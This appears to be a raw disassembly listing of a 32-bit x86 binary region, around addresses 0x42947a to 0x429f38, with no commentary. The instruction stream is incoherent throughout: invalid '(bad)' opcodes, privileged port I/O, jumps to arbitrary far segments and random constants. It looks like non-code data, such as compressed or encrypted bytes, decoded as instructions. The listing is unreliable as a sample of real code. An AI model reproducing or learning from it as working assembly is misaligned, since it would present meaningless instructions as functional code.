  42947a:	loop   0x429422
  42947c:	push   cs
  42947d:	inc    edx
  42947e:	data16 adc bl,BYTE PTR [ebx-0x1a]
  429482:	sahf   
  429483:	int3   
  429484:	loop   0x4294d7
  429486:	xor    esp,DWORD PTR [edi]
  429488:	cli    
  429489:	cmp    DWORD PTR [edi],esi
  42948b:	push   esp
  42948c:	fldcw  WORD PTR [ebp+0x7f]
  42948f:	mov    bl,0x59
  429491:	out    0x38,eax
  429493:	js     0x4294a7
  429495:	fdiv   QWORD PTR [edi]
  429497:	je     0x4294a4
  429499:	push   0xfffffff0
  42949b:	cmp    al,0xf4
  42949d:	or     ecx,DWORD PTR [eax-0x6d]
  4294a0:	push   ebp
  4294a1:	int3   
  4294a2:	popf   
  4294a3:	inc    ecx
  4294a4:	aad    0x55
  4294a6:	jne    0x4294bb
  4294a8:	dec    ebx
  4294a9:	and    al,dl
  4294ab:	loopne 0x4294db
  4294ad:	adc    ecx,DWORD PTR [ecx+0xad15640]
  4294b3:	int    0x4
  4294b5:	xor    eax,0x8d48462d
  4294ba:	push   edi
  4294bb:	add    al,0x22
  4294bd:	sbb    ebp,DWORD PTR ds:0x9e0ffbaf
  4294c3:	rol    DWORD PTR [ebx+ebx*8-0x5a],0x7e
  4294c8:	ror    dl,cl
  4294ca:	test   eax,0x9a83b94d
  4294cf:	shr    cl,0xa8
  4294d2:	in     al,0xb8
  4294d4:	data16 add al,0x2e
  4294d7:	mov    ebx,0xc61cd50b
  4294dc:	fistp  DWORD PTR [eax-0x4e497b60]
  4294e2:	add    dh,BYTE PTR [ecx+eax*2-0x20]
  4294e6:	fsubr  DWORD PTR [eax-0x3491b284]
  4294ec:	or     BYTE PTR [eax],al
	...
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x1d17e516],dx
  429565:	lods   al,BYTE PTR ds:[esi]
  429566:	cmp    DWORD PTR [edx+0xff0001],0x0
  42956d:	add    BYTE PTR [esp+eax*4+0x43],ah
  429571:	cdq    
  429572:	call   0x4cafb11c
  429577:	idiv   edi
  429579:	fsubp  st(4),st
  42957b:	pop    edi
  42957c:	xor    eax,0x18de21a2
  429581:	add    al,cl
  429583:	jle    0x42957b
  429585:	rol    DWORD PTR [ebx+0x54],1
  429588:	mov    bh,0x50
  42958a:	jg     0x4295e5
  42958c:	add    DWORD PTR [edi-0x7d3fb7c5],eax
  429592:	push   eax
  429593:	ss mov dh,bl
  429596:	and    al,0xa
  429598:	sbb    dh,ah
  42959a:	push   ebp
  42959b:	fbstp  TBYTE PTR [edi]
  42959d:	xor    BYTE PTR [edi-0x254b234c],0x68
  4295a4:	and    BYTE PTR [edi-0x7b],ch
  4295a7:	retf   
  4295a8:	pop    ebp
  4295a9:	pushf  
  4295aa:	leave  
  4295ab:	test   DWORD PTR [ebx+0x5b],0x5a41234f
  4295b2:	xchg   DWORD PTR ds:0x5d573b5a,edi
  4295b8:	fild   DWORD PTR [ebx-0x1f]
  4295bb:	xchg   esi,eax
  4295bc:	fwait
  4295bd:	adc    bl,BYTE PTR [ecx-0x47]
  4295c0:	mov    eax,ds:0xcd179221
  4295c5:	fcom   QWORD PTR [ecx+0x74]
  4295c8:	rol    DWORD PTR [eiz*8+0x27b8526a],0xc5
  4295d0:	mov    bh,0x7d
  4295d2:	adc    BYTE PTR [eax-0x3d],dl
  4295d5:	fistp  DWORD PTR [edx+0x7c5275c6]
  4295db:	push   es
  4295dc:	jmp    0xf796:0x6b312aa6
  4295e3:	jmp    0x4da9048
  4295e8:	(bad)  
  4295e9:	fwait
  4295ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295ec:	popaw  
  4295ee:	or     edi,DWORD PTR [edi+0x49]
  4295f1:	retf   0xf9b1
  4295f4:	push   0x69
  4295f6:	mov    ebp,0xb6ec21c0
  4295fb:	lods   al,BYTE PTR ds:[esi]
  4295fc:	mov    al,ds:0xaaa0a34d
  429601:	push   es
  429602:	adc    ebx,ebx
  429604:	sbb    eax,0x8cdac5ac
  429609:	js     0x4295d0
  42960b:	neg    DWORD PTR [ebx+0x1d]
  42960e:	mov    dl,0xad
  429610:	les    ebx,FWORD PTR [esi+eiz*4]
  429613:	sbb    esi,edi
  429615:	push   cs
  429616:	cmovns esp,esi
  429619:	add    BYTE PTR [esi+0x1142a9fc],0xae
  429620:	fcmovnu st,st(6)
  429622:	test   DWORD PTR [eax-0x5df7390e],eax
  429628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429629:	inc    edi
  42962a:	mov    bh,0x50
  42962c:	fld    st(7)
  42962e:	sbb    DWORD PTR [ebp+0x7c],esp
  429631:	shr    BYTE PTR [ebx+0x577fc8ad],cl
  429637:	inc    ebp
  429638:	pop    ds
  429639:	(bad)  
  42963a:	sbb    BYTE PTR [esi+0x21],ah
  42963d:	add    eax,0xbf6a9b9b
  429642:	sub    BYTE PTR [edi],bl
  429644:	push   ecx
  429645:	sti    
  429646:	mov    bl,0xf3
  429648:	add    bl,BYTE PTR [ecx]
  42964a:	jnp    0x4296b8
  42964c:	or     bl,cl
  42964e:	dec    ebx
  42964f:	pop    ebp
  429650:	xor    eax,0xce5f3f2e
  429655:	shl    ebp,cl
  429657:	adc    cl,BYTE PTR [esi]
  429659:	bound  edi,QWORD PTR [edi]
  42965b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42965c:	pop    ds
  42965d:	pop    ds
  42965e:	ins    BYTE PTR es:[edi],dx
  42965f:	jmp    0x42968f
  429661:	cli    
  429662:	or     al,0x87
  429664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429665:	add    bh,dh
  429667:	add    DWORD PTR [ebx+0x828aab0],0x0
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	js     0x4296de
  4296e4:	in     al,dx
  4296e5:	lods   al,BYTE PTR ds:[esi]
  4296e6:	cmp    BYTE PTR [ebx+0xff0001],0x0
  4296ed:	add    BYTE PTR [eax+0x72],bh
  4296f0:	sbb    ecx,DWORD PTR [esp+ebx*8-0x55]
  4296f4:	sub    bl,BYTE PTR [ecx]
  4296f6:	jnp    0x429742
  4296f8:	mov    eax,ds:0xc05d17a
  4296fd:	sub    al,BYTE PTR [eax+0xc]
  429700:	cmc    
  429701:	and    eax,DWORD PTR [esi+0x1]
  429704:	mov    al,ds:0xbddce932
  429709:	in     eax,dx
  42970a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42970b:	mov    eax,0xd5a6e69
  429710:	xor    BYTE PTR [ecx+0x7a2dedfe],0xf7
  429717:	adc    BYTE PTR [esi-0x62],0x52
  42971b:	mov    edi,0x5cde99a8
  429720:	outs   dx,BYTE PTR ds:[esi]
  429721:	aad    0xeb
  429723:	fistp  DWORD PTR [eax]
  429725:	aad    0xb4
  429727:	arpl   WORD PTR [esi-0x11877eff],sp
  42972d:	jo     0x429742
  42972f:	xor    DWORD PTR [edi-0x643f8cc3],ebp
  429735:	xchg   BYTE PTR [edi-0x49e1ffca],dh
  42973b:	inc    ebp
  42973c:	fldenv [ebx-0x2acff87d]
  429742:	lods   al,BYTE PTR ds:[esi]
  429743:	ja     0x429791
  429745:	jb     0x429797
  429747:	push   0x42
  429749:	inc    esp
  42974a:	rcl    BYTE PTR [eax+0x60],0x6a
  42974e:	sbb    DWORD PTR [ebp+0x38],edi
  429751:	mov    BYTE PTR [edx+0x6a],bh
  429754:	aad    0xa9
  429756:	pop    ss
  429757:	xor    al,0xfd
  429759:	ins    BYTE PTR es:[edi],dx
  42975a:	out    0x3f,al
  42975c:	adc    al,0x95
  42975e:	rcl    BYTE PTR ds:0xd64595ac,0x8
  429765:	js     0x429713
  429767:	or     ecx,DWORD PTR [eax-0x55]
  42976a:	jno    0x42978c
  42976c:	aad    0xe5
  42976e:	mov    edi,0x3a437da
  429773:	xchg   ebx,ecx
  429775:	add    al,0x91
  429777:	adc    ecx,DWORD PTR [ecx-0x58]
  42977a:	push   ds
  42977b:	test   eax,0x394efb6c
  429780:	sub    BYTE PTR [edi-0x3e],0xac
  429784:	and    eax,0x78110694
  429789:	sbb    eax,0x9b382213
  42978e:	jmp    0xbd163f5e
  429793:	mov    ds:0x74de1048,al
  429798:	loope  0x4297f7
  42979a:	jb     0x429720
  42979c:	loope  0x429732
  42979e:	imul   DWORD PTR [ecx]
  4297a0:	cs jne 0x429781
  4297a3:	aas    
  4297a4:	clc    
  4297a5:	into   
  4297a6:	dec    edi
  4297a7:	pop    ss
  4297a8:	sbb    BYTE PTR [eax],0x21
  4297ab:	xchg   DWORD PTR [edi],eax
  4297ad:	out    dx,al
  4297ae:	in     al,dx
  4297af:	adc    al,BYTE PTR [eax]
  4297b1:	cmp    DWORD PTR [esi+ebp*1-0x36],edi
  4297b5:	pop    ebx
  4297b6:	out    dx,eax
  4297b7:	fidiv  WORD PTR [ecx-0x413bbc7e]
  4297bd:	cmp    al,0xe1
  4297bf:	(bad)  
  4297c0:	les    edx,FWORD PTR [edx+0x5b]
  4297c3:	nop
  4297c4:	addr16 retf 
  4297c6:	ss mov al,0x13
  4297c9:	lock out 0xd5,al
  4297cc:	xchg   ebp,eax
  4297cd:	xor    edi,esi
  4297cf:	(bad)
  4297d2:	das    
  4297d3:	push   ebp
  4297d4:	push   eax
  4297d5:	xor    edi,ebp
  4297d7:	jns    0x4297ed
  4297d9:	cdq    
  4297da:	push   ecx
  4297db:	cmp    eax,0x9bc82c00
  4297e0:	imul   ebx,esp,0xc3d7043b
  4297e6:	cli    
  4297e7:	jmp    0x4d:0x969dea6
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	ins    BYTE PTR es:[edi],dx
  429863:	mov    bl,0x4d
  429865:	push   edi
  429866:	cmp    DWORD PTR [ecx+eax*1+0xff00],0xfcb0ce00
  429871:	xor    BYTE PTR [edx],0x82
  429874:	jmp    0x4298aa
  429876:	dec    edi
  429877:	or     DWORD PTR [ebp-0x67],ebp
  42987a:	mov    ebp,0xf117a29c
  42987f:	jmp    0x49f9:0x35ca8c76
  429886:	jae    0x429813
  429888:	into   
  429889:	fcmovb st,st(6)
  42988b:	push   es
  42988c:	sub    dh,cl
  42988e:	inc    eax
  42988f:	lahf   
  429890:	xchg   esi,eax
  429891:	pop    esi
  429892:	outs   dx,DWORD PTR ds:[esi]
  429893:	jno    0x429819
  429895:	js     0x429861
  429897:	es ret 
  429899:	sbb    al,0xb3
  42989b:	adc    eax,0x1db97e4c
  4298a0:	inc    edi
  4298a1:	or     BYTE PTR [edx],cl
  4298a3:	jae    0x429826
  4298a5:	push   ebx
  4298a6:	sbb    al,0x8
  4298a8:	and    ebx,DWORD PTR [edi-0x44]
  4298ab:	jecxz  0x42990b
  4298ad:	in     al,0x61
  4298af:	arpl   WORD PTR [edi],bx
  4298b1:	add    eax,0xc2a683e5
  4298b6:	cmp    al,0x98
  4298b8:	and    al,0x59
  4298ba:	lds    esp,FWORD PTR [ebx]
  4298bc:	jmp    0x3ccd:0xbb166098
  4298c3:	sbb    esp,edi
  4298c5:	mov    edi,DWORD PTR [edx+0x18c3f888]
  4298cb:	in     eax,0x93
  4298cd:	xor    BYTE PTR ds:0x82ae4af8,dl
  4298d3:	cmp    ch,BYTE PTR [ebx+0xe]
  4298d6:	pop    fs
  4298d8:	scas   eax,DWORD PTR es:[edi]
  4298d9:	xchg   edi,eax
  4298da:	dec    edx
  4298db:	or     eax,0x6eddea8a
  4298e0:	sbb    eax,DWORD PTR [ecx+0x1ade5611]
  4298e6:	push   esi
  4298e7:	fnstsw WORD PTR [ebp+0x13827aff]
  4298ed:	pop    edx
  4298ee:	add    dh,BYTE PTR [ecx+edi*4+0x5225c54e]
  4298f5:	and    al,0x6
  4298f7:	xor    edx,edi
  4298f9:	gs (bad) 
  4298fb:	or     bl,bh
  4298fd:	popf   
  4298fe:	inc    eax
  4298ff:	bound  ecx,QWORD PTR [eax-0x76921359]
  429905:	xor    bl,ah
  429907:	add    esi,DWORD PTR [ebx]
  429909:	xchg   edi,eax
  42990a:	and    al,0x36
  42990c:	cwde   
  42990d:	les    ebp,FWORD PTR [edi]
  42990f:	adc    DWORD PTR [edx+edi*1-0x3d3d8559],edx
  429916:	jno    0x42994f
  429918:	dec    edi
  429919:	jg     0x42997c
  42991b:	jg     0x42995c
  42991d:	or     BYTE PTR [ecx+ebx*1-0x40],cl
  429921:	jecxz  0x4298c4
  429923:	test   al,0xa5
  429925:	cmp    ebp,DWORD PTR [esi+0x51]
  429928:	jbe    0x42990d
  42992a:	sahf   
  42992b:	gs adc edi,edx
  42992e:	xor    dh,0xbc
  429931:	scas   al,BYTE PTR es:[edi]
  429932:	scas   al,BYTE PTR es:[edi]
  429933:	pusha  
  429934:	in     eax,0x5d
  429936:	das    
  429937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429938:	aas    
  429939:	xchg   ecx,eax
  42993a:	aam    0x58
  42993c:	cs pop ebx
  42993e:	and    BYTE PTR [ecx],bh
  429940:	add    ebx,DWORD PTR [ebp-0x5e]
  429943:	(bad)  
  429944:	enter  0x8687,0x68
  429948:	int3   
  429949:	call   0x8630e5ff
  42994e:	pop    ebp
  42994f:	in     al,dx
  429950:	push   edi
  429951:	(bad)  
  429952:	call   0x6b7d2b21
  429957:	sub    al,0xfb
  429959:	cmp    ch,BYTE PTR [ecx]
  42995b:	push   es
  42995c:	mov    al,ds:0xe3640d01
  429961:	xchg   ebp,eax
  429962:	push   ebx
  429963:	jp     0x42994e
  429965:	cs jbe 0x429941
  429968:	xor    eax,0x80263485
	...
  4299d5:	add    BYTE PTR [edi+0x68],dl
  4299d8:	fistp  QWORD PTR fs:[edi-0x21]
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	ss scas eax,DWORD PTR es:[edi]
  4299e4:	and    al,0xed
  4299e6:	cmp    BYTE PTR [ebp+0xff0001],0x0
  4299ed:	add    ch,dh
  4299ef:	jmp    0x5410:0x2cd400c
  4299f6:	fidiv  DWORD PTR [ebp+0x6e1fa3ae]
  4299fc:	sbb    al,0xe2
  4299fe:	jecxz  0x429a01
  429a00:	xchg   edi,eax
  429a01:	loopne 0x42998d
  429a03:	jg     0x429a34
  429a05:	mov    esp,0xd0fd664b
  429a0a:	repnz inc ebx
  429a0c:	ficomp DWORD PTR [ecx+0x2b]
  429a0f:	sub    DWORD PTR [ecx],ecx
  429a11:	(bad)  
  429a12:	sti    
  429a13:	and    eax,0x3e0cc9a1
  429a18:	and    DWORD PTR [eax+0x72],0x93d3e7e5
  429a1f:	cmp    al,0x4a
  429a21:	mul    ebx
  429a23:	leave  
  429a24:	fcmove st,st(1)
  429a26:	xchg   DWORD PTR [edx],ebp
  429a28:	add    dh,cl
  429a2a:	dec    ebx
  429a2b:	pop    ebx
  429a2c:	sbb    BYTE PTR [ebx+0x9],0xd5
  429a30:	xor    esi,DWORD PTR [esi-0x18]
  429a33:	mov    cl,0x18
  429a35:	mov    bh,0x73
  429a37:	out    dx,eax
  429a38:	retf   0x53c8
  429a3b:	addr16 (bad) 
  429a3d:	adc    al,0xe3
  429a3f:	inc    edx
  429a40:	enter  0x22ed,0x65
  429a44:	pop    ebp
  429a45:	inc    eax
  429a46:	inc    ebp
  429a47:	xchg   edx,eax
  429a48:	push   eax
  429a49:	push   0xffffffb0
  429a4b:	sub    BYTE PTR [eax-0x5c],ch
  429a4e:	mov    ebp,0xde103668
  429a53:	mov    ebp,0xae5f4b42
  429a58:	pop    ecx
  429a59:	stos   DWORD PTR es:[edi],eax
  429a5a:	imul   ebx,DWORD PTR [esi+0x27],0x5a
  429a5e:	sub    edx,DWORD PTR [edi]
  429a60:	fstp   QWORD PTR ds:0xb2bca797
  429a66:	mov    eax,esi
  429a68:	push   eax
  429a69:	pmaxsw mm0,QWORD PTR ds:0x7447493f
  429a70:	inc    esi
  429a71:	adc    al,0x54
  429a73:	call   0xdda1:0xed66e350
  429a7a:	lods   al,BYTE PTR ds:[esi]
  429a7b:	and    al,bl
  429a7d:	xor    ch,BYTE PTR [ecx+0x65]
  429a80:	or     BYTE PTR [esi+0x51],bh
  429a83:	ins    BYTE PTR es:[edi],dx
  429a84:	and    eax,0xfe9009aa
  429a89:	pop    ebp
  429a8a:	pushf  
  429a8b:	push   cs
  429a8c:	ret    
  429a8d:	jne    0x429a66
  429a8f:	(bad)  
  429a90:	int3   
  429a91:	cld    
  429a92:	mov    ss,esi
  429a94:	inc    edi
  429a95:	int3   
  429a96:	push   edi
  429a97:	push   edi
  429a98:	lods   eax,DWORD PTR ds:[esi]
  429a99:	mov    ebx,0x72346c3e
  429a9e:	dec    eax
  429a9f:	inc    ecx
  429aa0:	std    
  429aa1:	arpl   WORD PTR [eax],ax
  429aa3:	ret    0x1b06
  429aa6:	mov    cl,0x86
  429aa8:	or     eax,0x7899dd42
  429aad:	test   bl,cl
  429aaf:	and    DWORD PTR [ecx+0x6e],0xffffff86
  429ab3:	jo     0x429ada
  429ab5:	retf   0xd0e7
  429ab8:	and    BYTE PTR [ebx-0x75],0xed
  429abc:	lea    eax,[ebp-0x31733ead]
  429ac2:	jb     0x429af0
  429ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ac5:	push   ebx
  429ac6:	lahf   
  429ac7:	xchg   esp,eax
  429ac8:	ds retf 
  429aca:	or     cl,al
  429acc:	std    
  429acd:	fld    DWORD PTR [eax]
  429acf:	xchg   ebp,eax
  429ad0:	inc    ebp
  429ad1:	pop    ebx
  429ad2:	sbb    edx,DWORD PTR [esi]
  429ad4:	mov    esi,0x8e45c740
  429ad9:	jg     0x429a76
  429adb:	or     BYTE PTR [eax+edi*4],bh
  429ade:	pop    ss
  429adf:	int3   
  429ae0:	push   edx
  429ae1:	in     eax,dx
  429ae2:	sub    edi,DWORD PTR [esi+0x7]
  429ae5:	rol    BYTE PTR [ecx-0x49],1
  429ae8:	xchg   ebp,eax
  429ae9:	stc    
  429aea:	dec    esi
  429aeb:	or     esi,DWORD PTR [edi+0x0]
	...
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0xeca95667
  429b63:	or     DWORD PTR [esi+0x1be7f83],edi
  429b69:	add    bh,bh
  429b6b:	add    BYTE PTR [eax],al
  429b6d:	add    ch,ch
  429b6f:	dec    ebp
  429b70:	fwait
  429b71:	leave  
  429b72:	mov    edx,0x88a23586
  429b77:	test   eax,0x3e4e48a
  429b7c:	mul    ebp
  429b7e:	xchg   ebx,eax
  429b7f:	or     dh,BYTE PTR [eax-0x2986d30d]
  429b85:	xlat   BYTE PTR ds:[ebx]
  429b86:	js     0x429b2b
  429b88:	mov    edi,0x920deb4c
  429b8d:	imul   ebp,edx,0x11
  429b90:	(bad)  
  429b91:	icebp  
  429b92:	outs   dx,DWORD PTR ds:[esi]
  429b93:	jmp    0x7b8a727f
  429b98:	inc    ebp
  429b99:	int    0x78
  429b9b:	fnstsw WORD PTR [ebp-0x25271492]
  429ba1:	sahf   
  429ba2:	mov    esi,0xa623bf2c
  429ba7:	adc    DWORD PTR [ecx-0x5b],esi
  429baa:	call   0xcff912ee
  429baf:	aas    
  429bb0:	ret    
  429bb1:	ret    0xb745
  429bb4:	mov    dl,0xd3
  429bb6:	pop    esp
  429bb7:	int3   
  429bb8:	stos   BYTE PTR es:[edi],al
  429bb9:	sub    BYTE PTR [esi],0xe3
  429bbc:	jne    0x429bf5
  429bbe:	push   esi
  429bbf:	dec    ebx
  429bc0:	mov    ds:0x3274ddda,eax
  429bc5:	xor    al,0xbd
  429bc7:	xor    eax,0xdf0c9b0f
  429bcc:	rcl    DWORD PTR [ecx],0x2
  429bcf:	jae    0x429bd6
  429bd1:	add    BYTE PTR ds:0x6f62aa2c,0x7f
  429bd8:	bswap  esp
  429bda:	dec    esi
  429bdb:	lea    ebx,[ecx+0x179ef74f]
  429be1:	push   0xb466422c
  429be6:	or     bh,BYTE PTR [ebx]
  429be8:	lods   al,BYTE PTR ds:[esi]
  429be9:	jno    0x429c42
  429beb:	mov    eax,0xa757a0dd
  429bf0:	ret    
  429bf1:	push   ebp
  429bf2:	cmp    DWORD PTR [edi+0x15],0x31a401a8
  429bf9:	or     edi,esp
  429bfb:	jmp    0xa4e1:0x7017994d
  429c02:	call   0xa2a2:0x864b16db
  429c09:	enter  0xe451,0xb1
  429c0d:	jge    0x429c50
  429c0f:	cmp    al,0xcb
  429c11:	das    
  429c12:	and    eax,0x27c13498
  429c17:	inc    edi
  429c18:	sbb    ch,BYTE PTR [edx+0x32]
  429c1b:	sbb    BYTE PTR [ebx-0x53e9cf7d],bh
  429c21:	cmp    esi,DWORD PTR [edx+0x765d573e]
  429c27:	mov    bl,0x3
  429c29:	(bad)  
  429c2a:	push   0xffffffbf
  429c2c:	loopne 0x429ca0
  429c2e:	mov    al,ds:0x1c860316
  429c33:	hlt    
  429c34:	sbb    eax,0xc59aa58d
  429c39:	arpl   WORD PTR [ecx-0x72a2007c],di
  429c3f:	outs   dx,BYTE PTR gs:[esi]
  429c41:	jmp    0xd5e:0x25c88601
  429c48:	aad    0xf3
  429c4a:	repnz mov ebx,0xb94325c2
  429c50:	pusha  
  429c51:	aas    
  429c52:	xchg   DWORD PTR [edi],ebp
  429c54:	cmp    eax,0xab2802d1
  429c59:	mov    bh,0xf5
  429c5b:	(bad)  
  429c5c:	ds loope 0x429c61
  429c5f:	sbb    eax,edx
  429c61:	mov    ecx,0xcc2d2da5
  429c66:	jg     0x429bf6
  429c68:	inc    edi
  429c69:	mov    cs,edx
  429c6b:	(bad)  
  429c6c:	out    dx,eax
	...
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ecx+0x7e743b81],al
  429ce7:	mov    edi,0xff0001
  429cec:	add    BYTE PTR [eax],al
  429cee:	sub    DWORD PTR [eax-0x79],eax
  429cf1:	test   DWORD PTR [edx-0x9],ecx
  429cf4:	repnz (bad) 
  429cf6:	outs   dx,BYTE PTR ds:[esi]
  429cf7:	lods   eax,DWORD PTR ds:[esi]
  429cf8:	int3   
  429cf9:	adc    edi,eax
  429cfb:	jmp    0x429c9b
  429cfd:	pop    esp
  429cfe:	dec    ecx
  429cff:	mov    edi,0xf12b310b
  429d04:	mov    ebp,0x25ef8f28
  429d09:	push   ebx
  429d0a:	addr16 call 0x97b05b80
  429d10:	adc    bh,BYTE PTR [esi-0x5fd2223]
  429d16:	adc    BYTE PTR [esi+0x643b01b6],ah
  429d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d1d:	ds pop ecx
  429d1f:	fcomp  QWORD PTR [ebx+eiz*1+0x756e6002]
  429d26:	iret   
  429d27:	fiadd  DWORD PTR [edi*1-0x429102fd]
  429d2e:	xor    DWORD PTR [edx+0x64],edi
  429d31:	push   ebp
  429d32:	adc    dl,BYTE PTR [edx]
  429d34:	xchg   edx,eax
  429d35:	adc    bh,0x3d
  429d38:	rcl    BYTE PTR [eax+0x2b],1
  429d3b:	mov    bl,0x12
  429d3d:	shr    ch,cl
  429d3f:	pop    esp
  429d40:	les    edi,FWORD PTR [ebp+0x766a7928]
  429d46:	push   0x86417bf
  429d4b:	mov    ah,0x14
  429d4d:	xor    dl,BYTE PTR [ecx]
  429d4f:	sub    BYTE PTR [esi],bl
  429d51:	jbe    0x429d14
  429d53:	in     eax,dx
  429d54:	imul   esp,DWORD PTR [ecx+0x6a8ae700],0x22
  429d5b:	sbb    eax,0x8ed0da5a
  429d60:	nop
  429d61:	gs jmp 0xa77f:0xf5876a42
  429d69:	outs   dx,DWORD PTR ds:[esi]
  429d6a:	dec    edx
  429d6b:	call   0x2bcef32a
  429d70:	pop    edx
  429d71:	sub    BYTE PTR [eax+0x77],dl
  429d74:	popf   
  429d75:	aad    0xe8
  429d77:	mov    ds:0x8b3c2ac4,al
  429d7c:	call   0x3887498a
  429d81:	pop    ds
  429d82:	adc    ah,BYTE PTR [ebx]
  429d84:	pop    ecx
  429d85:	rcr    DWORD PTR [eax],1
  429d87:	lods   eax,DWORD PTR ds:[si]
  429d89:	nop
  429d8a:	stos   BYTE PTR es:[edi],al
  429d8b:	cmp    eax,edi
  429d8d:	bound  ebp,QWORD PTR ds:0x247352e7
  429d93:	mov    eax,0xbbc8a410
  429d98:	push   esi
  429d99:	cmp    esi,ecx
  429d9b:	retf   
  429d9c:	test   BYTE PTR [ebp-0x558330ea],cl
  429da2:	dec    esp
  429da3:	dec    esi
  429da4:	ret    
  429da5:	push   ebx
  429da6:	imul   edx,DWORD PTR [eax],0xb8c30782
  429dac:	aaa    
  429dad:	sub    al,0xd0
  429daf:	adc    edi,ebx
  429db1:	or     al,0x3b
  429db3:	in     al,dx
  429db4:	dec    edi
  429db5:	fisttp DWORD PTR [eax-0x3328f847]
  429dbb:	push   ebx
  429dbc:	lods   eax,DWORD PTR ds:[esi]
  429dbd:	mov    al,0xd
  429dbf:	push   esi
  429dc0:	cmp    BYTE PTR [eax+edi*1+0x29d36820],cl
  429dc7:	pop    esi
  429dc8:	sub    BYTE PTR [edx-0x77],bl
  429dcb:	add    al,0x64
  429dcd:	jbe    0x429e03
  429dcf:	pop    ebp
  429dd0:	cld    
  429dd1:	dec    ebp
  429dd2:	sbb    dh,BYTE PTR [edi+0x2]
  429dd5:	pushf  
  429dd6:	xchg   esi,eax
  429dd7:	pop    ss
  429dd8:	mov    BYTE PTR [ecx],ah
  429dda:	lods   al,BYTE PTR ds:[esi]
  429ddc:	dec    esp
  429ddd:	test   BYTE PTR [ebp-0x60],dl
  429de0:	pop    ds
  429de1:	mov    dl,0x9b
  429de3:	mov    BYTE PTR [ecx],cl
  429de5:	push   edi
  429de6:	mov    eax,ds:0x42735a6
  429deb:	push   0xffffffc3
	...
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	adc    bl,BYTE PTR [edx]
  429e64:	pop    edi
  429e65:	imul   edi,DWORD PTR [ebp-0x40],0x1
  429e69:	add    bh,bh
  429e6b:	add    BYTE PTR [eax],al
  429e6d:	add    BYTE PTR [eax+edi*2+0x31],cl
  429e71:	daa    
  429e72:	push   esi
  429e73:	push   edi
  429e74:	and    BYTE PTR [ecx+0x2d],bh
  429e77:	adc    ecx,ecx
  429e79:	add    BYTE PTR [esi+0x62fab777],dh
  429e7f:	push   0xcc2bf211
  429e84:	test   DWORD PTR [eax],esp
  429e86:	pop    ds
  429e87:	dec    eax
  429e88:	fimul  WORD PTR [edi-0x2e]
  429e8b:	(bad)  
  429e8d:	sbb    eax,0x2669cc88
  429e92:	cwde   
  429e93:	mov    ds:0x75dd25bf,eax
  429e98:	pop    edx
  429e99:	sub    ecx,DWORD PTR [edi]
  429e9b:	mov    edi,0xf34dc14d
  429ea0:	das    
  429ea1:	mov    edi,0x6f4a1f4c
  429ea6:	scas   eax,DWORD PTR es:[edi]
  429ea7:	or     al,0xd2
  429ea9:	adc    esi,esp
  429eab:	stos   BYTE PTR es:[edi],al
  429eac:	js     0x429f29
  429eae:	sub    esp,DWORD PTR [ebx]
  429eb0:	repz jl 0x429e70
  429eb3:	and    ch,0xb3
  429eb6:	add    al,0xa2
  429eb8:	jge    0x429f15
  429eba:	push   0x6
  429ebc:	cld    
  429ebd:	pop    ecx
  429ebe:	add    al,0xe8
  429ec0:	xchg   DWORD PTR [edi],ebp
  429ec2:	jmp    0xa5944495
  429ec7:	mov    ebx,0x37313925
  429ecc:	daa    
  429ecd:	mov    eax,ds:0xa0f0f263
  429ed2:	sbb    cl,al
  429ed4:	xchg   ecx,eax
  429ed5:	sub    al,0xf4
  429ed7:	lock je 0x429e64
  429eda:	test   DWORD PTR [ecx-0x709b2f19],esp
  429ee0:	les    edx,FWORD PTR [esi+0x6c]
  429ee3:	or     eax,0xbee5735c
  429ee8:	aaa    
  429ee9:	outs   dx,BYTE PTR ds:[esi]
  429eea:	lods   eax,DWORD PTR ds:[esi]
  429eeb:	cld    
  429eec:	add    ebp,0xfffffff6
  429eef:	inc    esi
  429ef0:	sar    DWORD PTR [ecx*1-0x545f34b9],cl
  429ef7:	ins    DWORD PTR es:[edi],dx
  429ef8:	sbb    bl,ah
  429efa:	jge    0x429f25
  429efc:	jp     0x429f06
  429efe:	or     al,0x3e
  429f00:	sar    bh,cl
  429f02:	push   eax
  429f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f04:	adc    dl,ch
  429f06:	jle    0x429f3f
  429f08:	sbb    BYTE PTR [eax+edx*2],dl
  429f0b:	cmp    ebx,DWORD PTR [esi+0x1c]
  429f0e:	icebp  
  429f0f:	ret    0x179
  429f12:	shl    BYTE PTR [edi-0x3e94ea01],0xa
  429f19:	imul   edi,DWORD PTR [ebx+0x53],0x5c5fc1c0
  429f20:	shl    BYTE PTR ds:0xf4347e21,0x61
  429f27:	inc    ebx
  429f28:	adc    BYTE PTR [edx-0x42],0xd2
  429f2c:	lock and eax,0x5b623aac
  429f32:	hlt    
  429f33:	sbb    eax,0x4b088b43
  429f38:	push   cs
